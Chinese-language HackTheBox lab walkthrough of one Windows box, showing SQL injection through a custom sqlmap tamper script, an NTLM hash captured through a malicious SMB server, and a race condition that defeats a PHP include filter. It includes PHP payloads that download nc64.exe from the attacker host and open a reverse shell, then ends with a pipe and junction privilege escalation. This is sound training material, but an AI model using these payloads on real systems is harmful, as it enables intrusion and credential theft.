<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.231</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.231</span><br><span class="line">Host is up (0.081s latency).</span><br><span class="line">Not shown: 999 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">80/tcp open  http    Microsoft IIS httpd 10.0</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure>
<h2 id="路径扫描-2"><a class="markdownIt-Anchor" href="#路径扫描-2"></a> 路径扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http://10.10.10.231/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.231/assets/</span><br><span class="line">==&gt; DIRECTORY: http://10.10.10.231/licenses/</span><br></pre></td></tr></table></figure>
<h2 id="漏洞利用-6"><a class="markdownIt-Anchor" href="#漏洞利用-6"></a> 漏洞利用</h2>
<p>浏览主页源码看到</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="meta">	&#x27;use strict&#x27;</span>;</span><br><span class="line">	jQuery(<span class="string">&#x27;#headerwrap&#x27;</span>).backstretch([ <span class="string">&quot;assets/img/bg/bg1.jpg&quot;</span>, <span class="string">&quot;assets/img/bg/bg3.jpg&quot;</span> ], &#123;<span class="attr">duration</span>: <span class="number">8000</span>, <span class="attr">fade</span>: <span class="number">500</span>&#125;);</span><br><span class="line">	$( <span class="string">&quot;#product-content&quot;</span> ).load(<span class="string">&quot;/products-ajax.php?order=id+desc&amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot;</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/products-ajax.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// [8] Undefined index: order On line 6 in file C:\inetpub\wwwroot\products-ajax.php</span></span><br><span class="line">	define(<span class="string">&#x27;SECURE_PARAM_SALT&#x27;</span>,<span class="string">&#x27;hie0shah6ooNoim&#x27;</span>); </span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&#x27;functions.php&#x27;</span>); </span><br><span class="line">	<span class="keyword">include</span>(<span class="string">&#x27;db-config.php&#x27;</span>); </span><br><span class="line">	<span class="keyword">if</span> ( !<span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>] || !<span class="variable">$_GET</span>[<span class="string">&#x27;h&#x27;</span>] ) &#123;</span><br><span class="line">		<span class="comment">// Set the response code to 500 </span></span><br><span class="line">		http_response_code(<span class="number">500</span>); </span><br><span class="line">		<span class="comment">// and die(). Someone fiddled with the parameters. </span></span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Parameter missing or malformed.&#x27;</span>); </span><br><span class="line">	&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>测试得到以下算法</p>
<p><code>Hash = md5(Salt+Payload)</code></p>
<p>SQLMap tamper</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">	salt = <span class="string">b&quot;hie0shah6ooNoim&quot;</span></span><br><span class="line">	h = hashlib.md5(salt + payload.encode()).hexdigest()</span><br><span class="line">	retVal = <span class="string">&quot;&#123;&#125;&amp;h=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload, h)</span><br><span class="line">	<span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py --dbs --batch --skip-urlencode</span><br><span class="line">available databases [3]:</span><br><span class="line">[*] cleaner</span><br><span class="line">[*] information_schema</span><br><span class="line">[*] <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner --tables --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">[3 tables]</span><br><span class="line">+-----------+</span><br><span class="line">| customers |</span><br><span class="line">| licenses  |</span><br><span class="line">| products  |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T licenses --columns --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: licenses</span><br><span class="line">[4 columns]</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| Column      | Type        |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| customer_id | int(11)     |</span><br><span class="line">| id          | int(11)     |</span><br><span class="line">| license     | varchar(50) |</span><br><span class="line">| product_id  | int(11)     |</span><br><span class="line">+-------------+-------------+</span><br><span class="line"></span><br><span class="line">proxychains sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T licenses -D customer_id,id,license,product_id --dump --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: licenses</span><br><span class="line">[18 entries]</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line">| customer_id | id | license                              | product_id |</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line">| 4           | 1  | 7d4cdf91-119b-414d-b16b-7cb841b2c182 | 4          |</span><br><span class="line">| 17          | 2  | e7b59b20-8c70-48b0-91da-58bf354b18d5 | 8          |</span><br><span class="line">| 17          | 3  | 3ea26f9c-f7c8-428f-a613-f4c66f08d0b9 | 6          |</span><br><span class="line">| 17          | 4  | 372b02bd-8730-4bc6-a6fb-8cf9726f797b | 4          |</span><br><span class="line">| 15          | 5  | 75ab3363-43d4-4e6b-903a-9d36919b36be | 8          |</span><br><span class="line">| 16          | 6  | 139aff78-770c-4c59-9aef-32c4c65e68b3 | 4          |</span><br><span class="line">| 22          | 7  | bdf82583-9f1a-42a3-b892-4b569e77f4c9 | 2          |</span><br><span class="line">| 11          | 8  | d7da6b56-6f8c-4a26-85cc-c80860f3021a | 8          |</span><br><span class="line">| 21          | 9  | 2ca03799-bd0d-4baa-a163-eb2a3b143f22 | 4          |</span><br><span class="line">| 7           | 10 | 0a65e4e4-f1c7-4452-9bf0-02f4d6c35410 | 4          |</span><br><span class="line">| 7           | 11 | 2e14ce43-8e85-43d7-b9ae-ab2c2ff64bf8 | 4          |</span><br><span class="line">| 15          | 12 | 873f8add-2f3c-4da2-9164-649f55c1d329 | 4          |</span><br><span class="line">| 2           | 13 | c63524b6-6346-4a34-b5c3-a3fe46593df1 | 4          |</span><br><span class="line">| 25          | 14 | ad228131-518a-4527-8a1c-46d0723b691d | 2          |</span><br><span class="line">| 1           | 15 | 4fa6a5cd-2081-4222-9b46-6c58df72bcfd | 8          |</span><br><span class="line">| 1           | 16 | 183a7e47-e3cf-46f9-80fa-acb63590cc1c | 2          |</span><br><span class="line">| 9           | 17 | 49dea5ef-3f7f-4790-9b94-b6bf29f5f893 | 2          |</span><br><span class="line">| 4           | 18 | 41e5be3a-20fc-47b2-9dcc-c05def688cdb | 6          |</span><br><span class="line">+-------------+----+--------------------------------------+------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T customers --columns --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: customers</span><br><span class="line">[4 columns]</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| Column        | Type         |</span><br><span class="line">+---------------+--------------+</span><br><span class="line">| customer_name | varchar(50)  |</span><br><span class="line">| id            | int(11)      |</span><br><span class="line">| login         | varchar(255) |</span><br><span class="line">| password      | varchar(255) |</span><br><span class="line">+---------------+--------------+</span><br><span class="line"></span><br><span class="line">sqlmap -u <span class="string">&quot;http://10.10.10.231/products-ajax.php?order=1&quot;</span> --tamper=tamp.py -D cleaner -T customers -C customer_name,id,login,password --dump --batch --skip-urlencode</span><br><span class="line">Database: cleaner</span><br><span class="line">Table: customers</span><br><span class="line">[11 entries]</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br><span class="line">| customer_name       | id | login                        | password                         |</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br><span class="line">| Vikki Solomon       | 1  | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c |</span><br><span class="line">| Neave Stone         | 2  | nstone@trashbin.mail         | 6cb75f652a9b52798eb6cf2201057c73 |</span><br><span class="line">| Bertie McEachern    | 3  | bmceachern7@discovery.moc    | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">| Jordana Kleiser     | 4  | jkleiser8@google.com.xy      | 827ccb0eea8a706c4c34a16891f84e7b |</span><br><span class="line">| Mariellen Chasemore | 5  | mchasemore9@sitemeter.moc    | 25f9e794323b453885f5181f1b624d0b |</span><br><span class="line">| Gwyneth Dornin      | 6  | gdornina@marriott.moc        | 5f4dcc3b5aa765d61d8327deb882cf99 |</span><br><span class="line">| Israel Tootell      | 7  | itootellb@forbes.moc         | f25a2fc72690b780b2a14e140ef6a9e0 |</span><br><span class="line">| Karon Mangham       | 8  | kmanghamc@state.tx.su        | 8afa847f50a716e64932d995c8e7435a |</span><br><span class="line">| Janifer Blinde      | 9  | jblinded@bing.moc            | fcea920f7412b5da7be0cf42b8c93759 |</span><br><span class="line">| Laurens Lenchenko   | 10 | llenchenkoe@macromedia.moc   | f806fc5a2a0d5ba2471600758452799c |</span><br><span class="line">| Andreana Austin     | 11 | aaustinf@booking.moc         | 25d55ad283aa400af464c76d713c07ad |</span><br><span class="line">+---------------------+----+------------------------------+----------------------------------+</span><br></pre></td></tr></table></figure>
<p>MD5基本都是弱口令</p>
<p>随意用一个凭证登入</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=&amp;h=9094e65be4a9dc27cd4af70674a99c64</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// [2] include(/header.inc): failed to open stream: No such file or directory On line 36 in file C:\inetpub\wwwroot\functions.php</span></span><br><span class="line">	<span class="comment">// Following function securely includes a file. Whenever we </span></span><br><span class="line">	<span class="comment">// will encounter a PHP tag we will just bail out here. </span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">secure_include</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">		<span class="keyword">if</span> (strpos(file_get_contents(<span class="variable">$file</span>),<span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line">			<span class="keyword">include</span>(<span class="variable">$file</span>);                <span class="comment">//&lt;&lt;&lt;&lt;&lt; Error encountered in this line.</span></span><br><span class="line">		&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">			http_response_code(<span class="number">403</span>); </span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Forbidden - Tampering attempt detected.&#x27;</span>); </span><br><span class="line">		&#125; </span><br><span class="line">	&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>尝试RFI</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9998</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=http://10.10.16.7:9998/&amp;h=c68113684a9e7ddca835d8f0235e2759</span><br><span class="line"></span><br><span class="line">[2] include(): http:// wrapper is disabled <span class="keyword">in</span> the server configuration by allow_url_include=0</span><br><span class="line">On line 36 <span class="keyword">in</span> file C:\inetpub\wwwroot\functions.php</span><br></pre></td></tr></table></figure>
<p>不能使用http协议</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -ip 10.10.16.7 -smb2support evil .</span><br><span class="line">curl http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7&amp;h=b1a3d9ecf02d4854f3a730f8b2a9af5d</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Incoming connection (10.10.10.231,51174)</span><br><span class="line">[*] AUTHENTICATE_MESSAGE (PROPER\web,PROPER)</span><br><span class="line">[*] User PROPER\web authenticated successfully</span><br><span class="line">[*] web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000</span><br><span class="line">[*] Closing down connection (10.10.10.231,51174)</span><br><span class="line">[*] Remaining connections []</span><br></pre></td></tr></table></figure>
<p>拿到Hash</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="built_in">hash</span> </span><br><span class="line">web::PROPER:aaaaaaaaaaaaaaaa:956a52cc975ff5da7c40b3a88a2280cd:0101000000000000808cbaf62b60d701fee1b72b5916ee630000000001001000670049005600790046004b0055006a00020010005a004a006b004300690054006a00480003001000670049005600790046004b0055006a00040010005a004a006b004300690054006a00480007000800808cbaf62b60d70106000400020000000800300030000000000000000000000000200000df729e7896fc8038dada23bc657eaeb31358ef464f456b1fa869efec2d18cea10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0037000000000000000000</span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line">charlotte123!    (web)</span><br></pre></td></tr></table></figure>
<p>得到凭证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web:charlotte123!</span><br></pre></td></tr></table></figure>
<p>重启smb服务</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py -ip 10.10.16.7 -username web -password charlotte123! -smb2support yolo .</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos(file_get_contents(<span class="variable">$file</span>),<span class="string">&#x27;&lt;?&#x27;</span>) === <span class="literal">false</span>) &#123; </span><br><span class="line">	<span class="keyword">include</span>(<span class="variable">$file</span>);                <span class="comment">//&lt;&lt;&lt;&lt;&lt; Error encountered in this line.</span></span><br></pre></td></tr></table></figure>
<p>通过竞争修改本地文件内容来进行Bypass</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">payload=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">while</span>((1))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$payload</span>&quot;</span> &gt; header.inc</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>GetShell</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;hacked&quot;</span>;system(<span class="string">&quot;cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\yolo.exe&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;hacked&quot;</span>;system(<span class="string">&quot;cmd /c start \windows\system32\spool\drivers\color\yolo.exe -e cmd 10.10.16.7 9990&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">thd</span>():</span></span><br><span class="line">	_ = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> _ &lt; <span class="number">100</span>:</span><br><span class="line">		req = requests.session()</span><br><span class="line">		login_url = <span class="string">&quot;http://10.10.10.231/licenses/index.php&quot;</span></span><br><span class="line">		username = <span class="string">&quot;vikki.solomon@throwaway.mail&quot;</span></span><br><span class="line">		password = <span class="string">&quot;password1&quot;</span></span><br><span class="line">		data = &#123;<span class="string">&quot;username&quot;</span>:username, <span class="string">&quot;password&quot;</span>:password&#125;</span><br><span class="line">		res = req.post(url=login_url, data=data)</span><br><span class="line">		index_url = <span class="string">&quot;http://10.10.10.231/licenses/licenses.php&quot;</span></span><br><span class="line">		res = req.get(url=index_url)</span><br><span class="line">		payload_url = <span class="string">&quot;http://10.10.10.231/licenses/licenses.php?theme=//10.10.16.7/yolo&amp;h=05e45a8f5f58f601063e937929048fd7&quot;</span></span><br><span class="line">		res = req.get(url=payload_url)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;hacked&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">			print(res.text)</span><br><span class="line">		logout_url = <span class="string">&quot;http://10.10.10.231/licenses/logout.php&quot;</span></span><br><span class="line">		res = req.get(url=logout_url)</span><br><span class="line">		_ += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">poll = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">5</span>):</span><br><span class="line">	single_thd = threading.Thread(target=thd)</span><br><span class="line">	poll.append(single_thd)</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> poll:</span><br><span class="line">	n.start()</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\nc64.exe</span><br></pre></td></tr></table></figure>
<p>不行</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c powershell iwr http://10.10.16.7:9995/nc64.exe -outf \windows\system32\spool\drivers\color\yolo.exe</span><br></pre></td></tr></table></figure>
<p>行</p>
<p>不知道触发了什么奇怪的bug, 改个文件名就能写入了<br />
<s>家目录下就能写, 害隔着World-Writable呢</s></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> c:\users\web\desktop\user.txt</span><br><span class="line">540dbda93520798e554345539fe38988</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-6"><a class="markdownIt-Anchor" href="#权限提升-6"></a> 权限提升</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir \&quot;Program Files<span class="string">&quot;\cleanup</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">11/15/2020  05:03 AM         2,999,808 client.exe</span></span><br><span class="line"><span class="string">11/15/2020  10:22 AM               174 README.md</span></span><br><span class="line"><span class="string">11/15/2020  06:20 AM         3,041,792 server.exe</span></span><br></pre></td></tr></table></figure>
<p>FTP莫名其妙用不了</p>
<p>传文件只能曲线救国了</p>
<p>Apache2允许PUT但是不能直接上传文件</p>
<p>不过文件会进行流量传输</p>
<p>所以就监听流量然后还原文件</p>
<p>逆向没逆明白, 只能看Raid上的WP了</p>
<p>先做一个链接</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink /j \users\web\downloads\yoloyolo \users\administrator\desktop</span><br></pre></td></tr></table></figure>
<p>操控管道<code>\\.\pipe\cleanuppipe</code></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> CLEAN \users\web\downloads\yoloyolo\root.txtx &gt; \\.\pipe\cleanuppipe</span><br></pre></td></tr></table></figure>
<p>此时Server.exe会通过管道的内容来运行程序, 会将程序加密并移动至<code>\programdata\cleanup</code>(这个程序应该是administrator运行的)</p>
<p>删掉链接, 创建文件夹, 再还原文件</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rmdir \users\web\downloads\yoloyolo</span><br><span class="line">mkdir \users\web\downloads\yoloyolo</span><br><span class="line"><span class="built_in">echo</span> RESTORE \users\web\downloads\yoloyolo\root.txtx &gt; \\.\pipe\cleanuppipe</span><br><span class="line"><span class="built_in">type</span> \users\web\downloads\yoloyolo\root.txt</span><br><span class="line"></span><br><span class="line">f2167014736b2934e9721962b525f674</span><br></pre></td></tr></table></figure>
<p><s>这台机子的姿势太骚了</s></p>
<p>What a box.</p>
<hr />
<h1 id="hackthebox_active"><a class="markdownIt-Anchor" href="#hackthebox_active"></a> HackTheBox_Active</h1>
<h2 id="端口扫描-7"><a class="markdownIt-Anchor" href="#端口扫描-7"></a> 端口扫描</h2>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.100</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.100</span><br><span class="line">Host is up (0.59s latency).</span><br><span class="line">Not shown: 982 closed ports</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Microsoft DNS 6.1.7601</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-04 09:21:59Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Service</span><br><span class="line">49152/tcp open  msrpc         Microsoft Windows RPC</span><br><span 